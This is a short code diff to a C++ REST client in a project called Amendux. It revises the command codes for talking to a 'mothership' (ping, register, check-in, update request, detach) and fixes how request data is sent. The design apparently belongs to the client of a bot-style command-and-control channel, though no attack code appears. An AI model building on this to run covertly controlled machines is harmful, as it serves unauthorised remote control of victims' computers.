@@ -7,15 +7,16 @@ namespace Amendux {
 
 	enum RestClientCommand {
 		CM_CLIENT_PING = 101, /* Check if mothership is alive */
-		CM_CLIENT_SOLICIT = 200, /* Register machine with mothership */
+		CM_CLIENT_SOLICIT = 200, /* Register boot with mothership */
 		CM_CLIENT_CHECKIN = 201, /* Checkin with mothership */
 		CM_CLIENT_UPDATE = 202, /* Request update */
 		CM_CLIENT_ELIMINATE = 299, /* Detach machine from mothership */
 	};
 
 	enum RestServerCommand {
-		CM_CLIENT_INVALID = 0, /* Command invalid */
-		CM_CLIENT_PONG = 101, /* Ping server response */
+		CM_SERVER_INVALID = 0, /* Command invalid */
+		CM_SERVER_PONG = 101, /* Ping server response */
+		CM_SERVER_ACK = 900, /* Acknowledge command */
 	};
 
 	class RestClient : public WebClient
@@ -31,7 +32,7 @@ namespace Amendux {
 
 		void *Call(RestClientCommand code, JSONValue *data, bool status = true) {
 			JSONObject obj;
-			obj[L"data"] = new JSONValue;
+			obj[L"data"] = data;
 			obj[L"code"] = new JSONValue(static_cast<double>(code));
 			obj[L"success"] = new JSONValue(status);
 
